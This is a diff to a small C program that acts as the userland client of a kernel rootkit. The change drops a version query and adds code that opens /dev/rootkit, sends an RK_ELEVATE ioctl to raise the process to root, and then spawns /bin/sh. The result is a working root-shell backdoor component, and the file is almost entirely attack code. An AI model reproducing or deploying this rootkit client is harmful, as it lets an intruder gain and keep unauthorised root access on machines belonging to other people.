@@ -6,49 +6,25 @@
 #include "../kernel/interface.h"
 
 int main(void) {
-
 	int fd;
-    int version = 0;
 
-    fd = open("/dev/rootkit", O_RDONLY);
+	fd = open("/dev/rootkit", O_RDWR);
 
-    if (fd == -1) {
+	 if (fd == -1) {
         perror("open");
-        return 1;
+        return -1;
     }
 
-    printf("Device opened successfully\n");
-
-    if (ioctl(fd, RK_GET_VERSION, &version) == -1) {
+    if (ioctl(fd, RK_ELEVATE) == -1) {
         perror("ioctl");
         close(fd);
-        return 1;
+        return -1;
     }
 
-    printf("Version: %d\n", version);
-
     close(fd);
-    return 0;
 
-	// int fd;
+    execl("/bin/sh", "sh", NULL);
+    perror("oopsies lmao");
 
-	// fd = open("/dev/rootkit", O_RDONLY);
-
-	//  if (fd == -1) {
-    //     perror("open");
-    //     return 1;
-    // }
-
-    // if (ioctl(fd, ELEVATE, NULL) == -1) {
-    //     perror("ioctl");
-    //     close(fd);
-    //     return 1;
-    // }
-
-    // close(fd);
-
-    // setuid(0);
-    // setgid(0);	
-    // system("/bin/sh");
-	// return 0;
+	return 0;
 }
